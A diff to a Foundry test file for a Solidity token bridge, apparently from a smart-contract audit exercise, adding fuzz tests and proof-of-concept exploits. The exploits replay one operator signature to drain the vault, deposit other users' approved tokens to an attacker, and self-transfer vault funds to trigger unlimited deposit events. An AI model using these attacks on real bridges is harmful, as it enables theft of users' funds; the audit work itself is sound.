@@ -110,20 +110,6 @@ contract L1BossBridgeTest is Test {
         vm.stopPrank();
     }
 
-    function testUserCanDepositTokens() public {
-        vm.startPrank(user);
-        uint256 amount = 10e18;
-        token.approve(address(tokenBridge), amount);
-
-        vm.expectEmit(address(tokenBridge));
-        emit Deposit(user, userInL2, amount);
-        tokenBridge.depositTokensToL2(user, userInL2, amount);
-
-        assertEq(token.balanceOf(address(tokenBridge)), 0);
-        assertEq(token.balanceOf(address(vault)), amount);
-        vm.stopPrank();
-    }
-
     function testUserCannotDepositBeyondLimit() public {
         vm.startPrank(user);
         uint256 amount = tokenBridge.DEPOSIT_LIMIT() + 1;
@@ -223,4 +209,157 @@ contract L1BossBridgeTest is Test {
     {
         return vm.sign(privateKey, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
     }
+
+    /*///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+                                HERE BEGIN THE PROOF OF CONCEPTS 
+    ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////*/
+
+    function testAttackerCanDrainAllFunds() public {
+        // A whale deposits
+        uint256 depositAmount = 100 ether;
+
+        vm.startPrank(user);
+        token.approve(address(tokenBridge), depositAmount);
+        tokenBridge.depositTokensToL2(user, userInL2, depositAmount);
+        vm.stopPrank();
+
+        // Create attacker, buy some tokens and deposit it
+        uint256 attackerAmount = 1 ether;
+        address attacker = makeAddr("attacker");
+        
+        vm.prank(tokenBridge.owner());
+        token.transfer(attacker, attackerAmount);
+
+        vm.startPrank(attacker);
+        token.approve(address(tokenBridge), attackerAmount);
+        tokenBridge.depositTokensToL2(attacker, userInL2, attackerAmount);
+        vm.stopPrank();
+
+        // An attacker starts draining
+        (uint8 v, bytes32 r, bytes32 s) = _signMessage(_getTokenWithdrawalMessage(attacker, attackerAmount), operator.key);
+        for(uint256 i=0; i<101; i++){
+            tokenBridge.withdrawTokensToL1(attacker, attackerAmount, v, r, s);
+        }
+        
+        assertEq(token.balanceOf(attacker), depositAmount + attackerAmount);
+    }
+
+    function testUserCanDepositTokens(uint256 amount) public {
+        vm.assume(amount>0 && amount <= 1000e18);
+        vm.startPrank(user);
+        token.approve(address(tokenBridge), amount);
+
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(user, userInL2, amount);
+        tokenBridge.depositTokensToL2(user, userInL2, amount);
+
+        assertEq(token.balanceOf(address(tokenBridge)), 0);
+        assertEq(token.balanceOf(address(vault)), amount);
+        vm.stopPrank();
+    }
+
+    function testFuzzUserCanWithdrawTokensWithOperatorSignature(uint256 depositAmount) public {
+        vm.assume(depositAmount>0 && depositAmount<=1000e18);
+        vm.deal(user, 1 ether);
+        vm.startPrank(user);
+        uint256 userInitialBalance = token.balanceOf(address(user));
+
+        token.approve(address(tokenBridge), depositAmount);
+        tokenBridge.depositTokensToL2(user, userInL2, depositAmount);
+
+        assertEq(token.balanceOf(address(vault)), depositAmount);
+        assertEq(token.balanceOf(address(user)), userInitialBalance - depositAmount);
+
+        (uint8 v, bytes32 r, bytes32 s) = _signMessage(_getTokenWithdrawalMessage(user, depositAmount), operator.key);
+        tokenBridge.withdrawTokensToL1(user, depositAmount, v, r, s);
+
+        assertEq(token.balanceOf(address(user)), userInitialBalance);
+        assertEq(token.balanceOf(address(vault)), 0);
+        vm.stopPrank();
+
+        // These are the invariants
+        assertEq(token.totalSupply(), 1_000_000e18);
+        assertEq(token.totalSupply(), token.balanceOf(deployer)+1000e18);
+
+    }
+
+    function testFuzzUserCannotWithdrawTokensWithUnknownOperatorSignature(uint256 depositAmount, uint256 falseOperator) public {
+        vm.assume(depositAmount>0 && depositAmount<=1000e18);
+        vm.assume(operator.key != falseOperator && falseOperator != 0 && falseOperator<115792089237316195423570985008687907852837564279074904382605163141518161494337);
+
+        vm.startPrank(user);
+        uint256 userInitialBalance = token.balanceOf(address(user));
+
+        token.approve(address(tokenBridge), depositAmount);
+        tokenBridge.depositTokensToL2(user, userInL2, depositAmount);
+
+        assertEq(token.balanceOf(address(vault)), depositAmount);
+        assertEq(token.balanceOf(address(user)), userInitialBalance - depositAmount);
+
+        (uint8 v, bytes32 r, bytes32 s) =
+            _signMessage(_getTokenWithdrawalMessage(user, depositAmount), falseOperator);
+
+        vm.expectRevert(L1BossBridge.L1BossBridge__Unauthorized.selector);
+        tokenBridge.withdrawTokensToL1(user, depositAmount, v, r, s);
+
+    }
+
+    function testIsNotNeccessaryAttackerToDepositToDrainFunds() public {
+        vm.startPrank(user);
+        uint256 userInitialBalance = token.balanceOf(address(user));
+        uint256 depositAmount = 100 ether;
+        token.approve(address(tokenBridge), depositAmount);
+        tokenBridge.depositTokensToL2(user, userInL2, depositAmount);
+
+        assertEq(token.balanceOf(address(vault)), depositAmount);
+        assertEq(token.balanceOf(address(user)), userInitialBalance - depositAmount);
+
+        uint256 attackerAmount = 1 ether;
+        address attacker = makeAddr("attacker");
+        (uint8 v, bytes32 r, bytes32 s) = _signMessage(_getTokenWithdrawalMessage(attacker, attackerAmount), operator.key);
+        
+        tokenBridge.withdrawTokensToL1(attacker, attackerAmount, v, r, s);
+
+        for(uint i =0; i<99; i++ ){
+            tokenBridge.withdrawTokensToL1(attacker, attackerAmount, v, r, s);
+        }
+
+        console2.log(token.balanceOf(attacker)/1e18);
+    }
+
+    function testCanMoveApproveTokensOfOtherUsers() public {
+        // poor alice approving
+        vm.prank(user);
+        token.approve(address(tokenBridge), type(uint256).max);
+
+        // Bob
+        uint256 depositAmount = token.balanceOf(user);
+        address attacker = makeAddr("attacker"); 
+        vm.startPrank(attacker);
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(user, attacker, depositAmount);
+        tokenBridge.depositTokensToL2(user, attacker, depositAmount); 
+
+        assertEq(token.balanceOf(user), 0);
+        assertEq(token.balanceOf(address(vault)), depositAmount);
+        vm.stopPrank();
+    }
+
+    function testCanTransferFromVaultToVault() public {
+        address attacker = makeAddr("attacker");
+
+        uint256 vaultBalance = 500 ether;
+        deal(address(token), address(vault), vaultBalance);
+
+        // Can trigger the deposi event, self transfer tokens to the vault 
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(address(vault), attacker, vaultBalance);
+        tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance); 
+
+        // Can do this forever
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(address(vault), attacker, vaultBalance);
+        tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance); 
+    }
+
 }
